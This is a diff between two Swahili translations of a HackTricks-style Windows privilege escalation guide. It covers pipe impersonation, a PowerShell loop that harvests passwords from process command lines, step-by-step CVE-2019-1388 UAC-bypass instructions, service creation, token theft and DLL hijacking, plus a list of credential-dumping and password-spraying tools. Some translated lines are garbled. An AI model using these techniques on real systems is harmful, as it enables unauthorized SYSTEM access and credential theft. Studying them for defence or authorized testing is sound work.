-Wakati data inatumwa kupitia mpira na **mteja**, **seva** ambayo ilianzisha mpira ina uwezo wa **kuchukua utambulisho** wa **mteja**, ikidhani ina **haki za SeImpersonate** zinazohitajika. Kutambua mchakato uliopewa mamlaka ambao unawasiliana kupitia mpira unaweza kutoa fursa ya **kupata mamlaka ya juu** kwa kuchukua utambulisho wa mchakato huo mara tu inaposhirikiana na mpira uliowekwa. Kwa maelekezo juu ya kutekeleza shambulio kama hilo, mwongozo wenye manufaa unaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](./#from-high-integrity-to-system).
+Wakati data inatumwa kupitia bomba na **mteja**, **mhudumu** aliyeunda bomba ana uwezo wa **kuchukua utambulisho** wa **mteja**, ikizingatiwa kuwa una **haki za SeImpersonate** zinazohitajika. Kutambua **mchakato wenye mamlaka** unaozungumza kupitia bomba unaweza kufanana na nafasi ya **kupata mamlaka ya juu** kwa kuchukua utambulisho wa mchakato huo mara unaposhirikiana na bomba uliloanzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, mwongozo mzuri unaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](./#from-high-integrity-to-system).
 
-Pia zana ifuatayo inaruhusu **kukamata mawasiliano ya mpira iliyo na jina na zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona mipira yote ili kupata uwezo wa mamlaka** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Pia zana ifuatayo inaruhusu **kukamata mawasiliano ya bomba lililopewa jina na zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona mabomba yote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
-## Vinginevyo
+## Mambo Mengine
 
 ### **Kufuatilia Mistari ya Amri kwa ajili ya nywila**
 
-Kupata kikao kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo **inapitisha siri kwenye mstari wa amri**. Skripti ifuatayo inakamata mistari ya amri ya michakato kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali ya awali, ikitoa tofauti yoyote.
+Unapopata kabati kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo **inapitisha siri kwenye mstari wa amri**. Skripti iliyo chini inakamata mistari ya amri ya michakato kila sekunde mbili na kulinganisha hali ya sasa na ile ya awali, ikitoa tofauti zozote.
 ```powershell
 while($true)
 {
@@ -1668,11 +1259,13 @@ $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
 Compare-Object -ReferenceObject $process -DifferenceObject $process2
 }
 ```
-## Kutoka kwa Mtumiaji wa Haki za Chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / Kupita UAC
+## Kuiba nywila kutoka kwa michakato
 
-Ikiwa una ufikiaji wa kiolesura cha picha (kupitia konsoli au RDP) na UAC imeamilishwa, katika baadhi ya toleo za Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.
+## Kutoka kwa Mtumiaji wa Low Priv hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / Kupuuza UAC
 
-Hii inawezesha kuongeza haki za mtumiaji na kuepuka UAC wakati huo huo kwa kutumia kasoro hiyo hiyo. Aidha, hakuna haja ya kufunga kitu chochote na faili inayotumiwa wakati wa mchakato huo, imehakikiwa na kutolewa na Microsoft.
+Ikiwa una ufikiaji wa kiolesura cha picha (kupitia konsoli au RDP) na UAC imewezeshwa, katika baadhi ya toleo za Microsoft Windows inawezekana kuzindua terminal au michakato mingine kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na mamlaka.
+
+Hii inawezesha kuinua mamlaka na kupuuza UAC wakati huo huo kwa kutumia kasoro hiyo hiyo. Aidha, hakuna haja ya kusakinisha kitu chochote na faili inayotumiwa wakati wa mchakato huo, imehakikishwa na kutolewa na Microsoft.
 
 Baadhi ya mifumo iliyoathiriwa ni kama ifuatavyo:
 ```
@@ -1696,160 +1289,158 @@ Windows 10 1607	14393	** link OPENED AS SYSTEM **
 Windows 10 1703	15063	link NOT opened
 Windows 10 1709	16299	link NOT opened
 ```
-Kuendeleza udhaifu huu, ni muhimu kufuata hatua zifuatazo:
-
+Ili kutumia udhaifu huu, ni muhimu kufuata hatua zifuatazo:
 ```
-1) Bonyeza kulia kwenye faili ya HHUPD.EXE na uifanye kazi kama Msimamizi.
+1) Right click on the HHUPD.EXE file and run it as Administrator.
 
-2) Wakati kisanduku cha UAC kinapoonekana, chagua "Onyesha maelezo zaidi".
+2) When the UAC prompt appears, select "Show more details".
 
-3) Bonyeza "Onyesha cheti cha mtoa huduma".
+3) Click "Show publisher certificate information".
 
-4) Ikiwa mfumo ni dhaifu, unapobonyeza kiungo cha URL "Imetolewa na", kivinjari cha wavuti cha chaguo-msingi kinaweza kuonekana.
+4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.
 
-5) Subiri tovuti ipakie kabisa na chagua "Hifadhi kama" ili kuleta dirisha la explorer.exe.
+5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.
 
-6) Katika njia ya anwani ya dirisha la explorer, ingiza cmd.exe, powershell.exe au mchakato mwingine wa kuingiliana.
+6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.
 
-7) Sasa utakuwa na dirisha la amri la "NT\UTHIBITISHO WA SYSTEM".
+7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.
 
-8) Kumbuka kufuta usanidi na kisanduku cha UAC ili kurudi kwenye desktop yako.
+8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
-
-Unayo faili na habari zote muhimu katika hazina ya GitHub ifuatayo:
+Unayo faili zote muhimu na habari katika hifadhi ya GitHub ifuatayo:
 
 https://github.com/jas502n/CVE-2019-1388
 
-## Kutoka kiwango cha Msimamizi cha Kati hadi cha Juu / Kuepuka UAC
+## Kutoka kwa Msimamizi wa Kati hadi Ngazi Kubwa ya Uadilifu / Kupuuza UAC
 
-Soma hii ili **kujifunza kuhusu Viwango vya Uaminifu**:
+Soma hii **kujifunza kuhusu Viwango vya Uadilifu**:
 
 {% content-ref url="integrity-levels.md" %}
 [integrity-levels.md](integrity-levels.md)
 {% endcontent-ref %}
 
-Kisha **soma hii ili kujifunza kuhusu UAC na njia za kuepuka UAC:**
+Kisha **soma hii kujifunza kuhusu UAC na njia za kupuuza UAC:**
 
 {% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
 [uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-## **Kutoka kiwango cha Juu hadi System**
+## **Kutoka kwa Uadilifu wa Juu hadi System**
 
 ### **Huduma Mpya**
 
-Ikiwa tayari unatumia mchakato wa Kiwango cha Juu, **kupita kwa SYSTEM** kunaweza kuwa rahisi tu kwa **kuunda na kutekeleza huduma mpya**:
+Ikiwa tayari unatekelezwa kwenye mchakato wa Uadilifu wa Juu, **njia ya kufikia SYSTEM** inaweza kuwa rahisi tu kwa **kuunda na kutekeleza huduma mpya**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 ### AlwaysInstallElevated
 
-Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha kuingiza kila wakati kwa kuingiza kila wakati kwa kuingiza kila wakati** na **kufunga** kifuniko cha nyuma kwa kutumia _**.msi**_.\
+Kutoka kwa mchakato wa High Integrity unaweza **jaribu kuwezesha kuingiza kila wakati kwa kuingiza kuingiza** na **kufunga** kifuniko cha _**.msi**_ kutumia _**.msi**_ wrapper.\
 [Maelezo zaidi kuhusu funguo za usajili zinazohusika na jinsi ya kufunga pakiti ya _.msi_ hapa.](./#alwaysinstallelevated)
 
-### High + SeImpersonate kibali kwa System
+### High + SeImpersonate uwezo wa System
 
-**Unaweza** [**kupata nambari hapa**](seimpersonate-from-high-to-system.md)**.**
+**Unaweza** [**pata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**
 
-### Kutoka SeDebug + SeImpersonate hadi Token kamili ya kibali
+### Kutoka SeDebug + SeImpersonate hadi mamlaka kamili ya Token
 
-Ikiwa una vibali vya token hivyo (labda utapata hii katika mchakato wa High Integrity tayari), utaweza **kufungua karibu mchakato wowote** (sio mchakato uliolindwa) na kibali cha SeDebug, **nakala ya token** ya mchakato, na kuunda **mchakato wa kiholela na token hiyo**.\
-Kutumia mbinu hii kawaida **huchaguliwa mchakato wowote unaofanya kazi kama SYSTEM na vibali vyote vya token** (_ndio, unaweza kupata michakato ya SYSTEM bila vibali vyote vya token_).\
-**Unaweza kupata** [**mfano wa nambari inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**
+Ikiwa una mamlaka hizo za token (labda utapata hii katika mchakato wa High Integrity tayari), utaweza **kufungua karibu mchakato wowote** (sio mchakato uliolindwa) na mamlaka ya SeDebug, **nakala ya token** ya mchakato, na kuunda **mchakato wa kupindukia na token huo**.\
+Kutumia mbinu hii kawaida **huchagua mchakato wowote unaofanya kazi kama SYSTEM na mamlaka yote ya token** (_ndiyo, unaweza kupata michakato ya SYSTEM bila mamlaka yote ya token_).\
+**Unaweza kupata** [**mfano wa msimbo unaoendesha mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**
 
-### **Pipes Zilizoitwa**
+### **Pipes Zilizopewa Majina**
 
-Mbinu hii hutumiwa na meterpreter kuongeza kasi katika `getsystem`. Mbinu hii inajumuisha **kuunda bomba na kisha kuunda/tumia huduma ya kuandika kwenye bomba hilo**. Kisha, **seva** ambayo iliunda bomba kwa kutumia kibali cha **`SeImpersonate`** itaweza **kuiga token** ya mteja wa bomba (huduma) kupata vibali vya SYSTEM.\
-Ikiwa unataka [**kujifunza zaidi kuhusu mabomba ya jina unapaswa kusoma hii**](./#named-pipe-client-impersonation).\
-Ikiwa unataka kusoma mfano wa [**jinsi ya kwenda kutoka kwa uadilifu wa juu hadi System kwa kutumia mabomba ya jina unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).
+Mbinu hii hutumiwa na meterpreter kwa kuzidisha katika `getsystem`. Mbinu hii inajumuisha **kuunda bomba kisha kuunda/kutumia huduma ya kuandika kwenye bomba hilo**. Kisha, **server** ambayo iliunda bomba kwa kutumia **mamlaka ya SeImpersonate** itaweza **kuiga token** ya mteja wa bomba (huduma) kupata mamlaka ya SYSTEM.\
+Ikiwa unataka [**kujifunza zaidi kuhusu mabomba ya majina unapaswa kusoma hii**](./#named-pipe-client-impersonation).\
+Ikiwa unataka kusoma mfano wa [**jinsi ya kwenda kutoka kwa uadilifu wa juu hadi System kwa kutumia mabomba ya majina unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-Ikiwa unaweza **kuteka dll** inayotumiwa na **mchakato** unaofanya kazi kama **SYSTEM** utaweza kutekeleza nambari ya kiholela na vibali hivyo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya kuongeza kasi ya kibali, na, zaidi ya hayo, ikiwa mbali **ni rahisi zaidi kufikia kutoka kwa mchakato wa uadilifu wa juu** kwani itakuwa na **ruhusa za kuandika** kwenye folda zinazotumiwa kusoma dlls.\
-**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking.md)**.**
+Ikiwa unafanikiwa **kuteka dll** inayotumiwa na **mchakato** unaofanya kazi kama **SYSTEM** utaweza kutekeleza msimbo wa aina yoyote na mamlaka hayo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya kuzidisha mamlaka, na, zaidi ya hayo, ni **rahisi zaidi kufikia kutoka kwa mchakato wa uadilifu wa juu** kwani itakuwa na **ruhusa za kuandika** kwenye folda zinazotumiwa kupakia dlls.\
+**Unaweza** [**jifunze zaidi kuhusu Dll hijacking hapa**](dll-hijacking.md)**.**
 
 ### **Kutoka kwa Msimamizi au Huduma ya Mtandao hadi System**
 
 {% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}
 
-### Kutoka kwa Huduma ya Mitaa au Huduma ya Mtandao hadi vibali kamili
+### Kutoka kwa HUDUMA YA LOKALI au HUDUMA YA MTANDAO hadi mamlaka kamili
 
 **Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
-## Msaada zaidi
+## Msaada Zaidi
 
-[Imejumuishwa kwa imara](https://github.com/ropnop/impacket\_static\_binaries)
+[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
 
-## Zana muhimu
+## Vyombo Vya Kufaa
 
-**Zana bora ya kutafuta vekta za kuongeza kasi ya kibali cha Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Zana bora ya kutafuta vekta za kuzidisha mamlaka za ndani za Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **- Angalia kwa misconfigurations na faili nyeti (**[**angalia hapa**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Imegunduliwa.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **- Angalia kwa misconfigurations fulani inayowezekana na kukusanya habari (**[**angalia hapa**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**- Angalia kwa misconfigurations**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **- Inachukua habari ya kikao kilichohifadhiwa cha PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa mitaa.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **- Inachukua vibali kutoka kwa Meneja wa Vitambulisho. Imegunduliwa.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **- Panya nywila zilizokusanywa kote kwenye kikoa**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **- Inveigh ni chombo cha PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na man-in-the-middle.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **- Uchunguzi wa msingi wa Windows wa kuongeza kasi ya kibali**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ - Tafuta udhaifu maarufu wa kuongeza kasi ya kibali (IMEPITWA NA WAKATI kwa Watson)\
-[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) - Angalia za mitaa **(Inahitaji haki za Msimamizi)**
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia kwa misconfigurations na faili nyeti (**[**angalia hapa**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Imegunduliwa.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia kwa baadhi ya misconfigurations inayowezekana na kukusanya habari (**[**angalia hapa**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia kwa misconfigurations**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Inachambua habari za kikao kilichohifadhiwa cha PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa ndani.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Inachambua vibali kutoka kwa Meneja wa Vibali. Imegunduliwa.**\
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Panya nywila zilizokusanywa kote kwenye kikoa**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni chombo cha PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na man-in-the-middle.**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchunguzi wa msingi wa Windows wa privesc**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Tafuta mapungufu yaliyojulikana ya privesc (IMEACHWA KWA Watson)\
+[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Uchunguzi wa ndani **(Inahitaji Haki za Msimamizi)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) - Tafuta udhaifu maarufu wa kuongeza kasi ya kibali (inahitaji kuchapishwa kwa kutumia VisualStudio) ([**imechapishwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) - Inataja mwenyeji kwa kutafuta misconfigurations (zaidi ya zana ya kukusanya habari kuliko kuongeza kasi ya kibali) (inahitaji kuchapishwa) **(**[**imechapishwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **- Inachukua vibali kutoka kwa programu nyingi (exe iliyochapishwa mapema kwenye github)**\
-[**SharpUP**](https://github.com/GhostPack/SharpUp) **- Port ya PowerUp kwenda C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ - Angalia kwa misconfigurations (exe iliyochapishwa mapema kwenye github). Haipendekezi. Haifanyi kazi vizuri katika Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) - Angalia kwa misconfigurations inayowezekana (exe kutoka kwa python). Haipendekezi. Haifanyi kazi vizuri katika Win10.
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta mapungufu yaliyojulikana ya privesc (inahitaji kuchakatwa kwa kutumia VisualStudio) ([**iliyokwisha kuchakatwa**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Inahesabu mwenyeji kutafuta misconfigurations (zaidi ya zana ya kukusanya habari kuliko privesc) (inahitaji kuchakatwa) **(**[**iliyokwisha kuchakatwa**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Inachambua vibali kutoka kwa programu nyingi (exe iliyokwisha kuchakatwa kwenye github)**\
+[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Angalia kwa misconfigurations (exe iliyokwisha kuchakatwa kwenye github). Haipendekezi. Haifanyi kazi vizuri kwenye Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia kwa misconfigurations inayowezekana (exe kutoka python). Haipendekezi. Haifanyi kazi vizuri kwenye Win10.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Zana iliyoanzishwa kulingana na chapisho hili (haina haja ya accesschk kufanya kazi vizuri lakini inaweza kutumia).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoanzishwa kulingana na chapisho hili (haina haja ya accesschk kufanya kazi vizuri lakini inaweza kutumia).
 
-**Mitaa**
+**Ndani**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - Inasoma matokeo ya **systeminfo** na kupendekeza udhaifu wa kazi (python ya mitaa)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) - Inasoma matokeo ya **systeminfo** na kupendekeza udhaifu wa kazi (python ya mitaa)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma matokeo ya **systeminfo** na kupendekeza mbinu za kazi (python ya ndani)\
+[**Windows Exploit Suggester Kizazi Kijacho**](https://github.com/bitsadmin/wesng) -- Inasoma matokeo ya **systeminfo** na kupendekeza mbinu za kazi (python ya ndani)
 
 **Meterpreter**
 
 _multi/recon/local\_exploit\_suggestor_
 
-Lazima uchapishe mradi k
+Unapaswa kuchakata mradi kwa kutumia toleo sahihi la .NET ([angalia hii](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo lililowekwa la .NET kwenye mwenyeji wa mwathiriwa unaweza kufanya:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
 ## Marejeo
 
-* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
-* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
-* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
-* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
-* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
-* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
-* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
-* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
-* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
-* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
-* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
-* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
-* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
+* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
+* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
+* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
+* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
+* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
+* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
+* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
+* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
+* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
+* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
+* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
+* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee.
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionyeshwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
